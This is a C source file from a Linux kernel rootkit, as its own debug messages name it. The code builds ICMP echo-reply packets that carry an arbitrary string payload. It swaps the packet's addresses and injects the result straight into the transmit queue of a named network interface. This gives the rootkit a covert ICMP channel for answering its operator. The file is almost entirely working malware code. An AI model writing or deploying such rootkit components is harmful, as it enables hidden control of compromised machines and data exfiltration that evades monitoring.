#include "icmp.h"


int return_icmp(char* string, args_t* args, struct net_device* dev){

    struct icmphdr* icmph = args->icmph;
    struct iphdr* iph = args->iph;
    struct ethhdr* eth = args->eth;

    u64 payload_size = strlen(string);
    u32 saddr_copy;
    unsigned char* payload;


    int ret;
    struct sk_buff* skb;
    struct icmphdr* new_icmph;
    struct iphdr* new_iph;
    struct ethhdr* new_eth;


    DEBUG_PUTS("rootkit: 1\n")
    // allocation memort for 3 headers + payload
    skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);

    DEBUG_PUTS("rootkit: 2\n")

    // reserving size for headers
    skb_reserve(skb, ICMP_HSIZE + IP_HSIZE + ETH_HLEN);

    // putting the payload in socket buffer
    payload = skb_put(skb, payload_size);
    memcpy(payload, string, payload_size);

    // icmp header needs only to change the type
    new_icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
    memcpy(new_icmph, icmph, ICMP_HSIZE);
    new_icmph->type = ICMP_ECHOREPLY;

    new_icmph->checksum = 0;
    new_icmph->checksum = ip_compute_csum(new_icmph, payload_size + ICMP_HSIZE);


 
    new_iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
    memcpy(new_iph, iph, IP_HSIZE);
    new_iph->tot_len = htons(ICMP_HSIZE + IP_HSIZE + payload_size);

    // swapping sender and reciever
    saddr_copy = new_iph->saddr;
    new_iph->saddr = new_iph->daddr;
    new_iph->daddr = saddr_copy;
    DEBUG_PUTS("rootkit: 3\n")

    // configuring the socket
    skb->dev = dev;
    skb->pkt_type = PACKET_OUTGOING;
    skb->protocol = htons(ETH_P_IP);
    skb->no_fcs = 1;
    


    new_eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));
    memcpy(new_eth, eth, ETH_HLEN);

    memcpy(new_eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(new_eth->h_dest, eth->h_source, ETH_ALEN);
    

    // adding the packet to transmit queue
    ret = dev_queue_xmit(skb);

    DEBUG_PRINTF("rootkit: ret: %d\n", ret)
    

    return ret;
}


void send_response(char* string, args_t* args) {

    struct net_device *enp0s3;
    enp0s3 = dev_get_by_name(&init_net,"enp0s3");
    return_icmp(string, args, enp0s3);

    // freeing the device
    dev_put(enp0s3);

    // freeing recieved packet content
    kfree_skb(args->skb);
}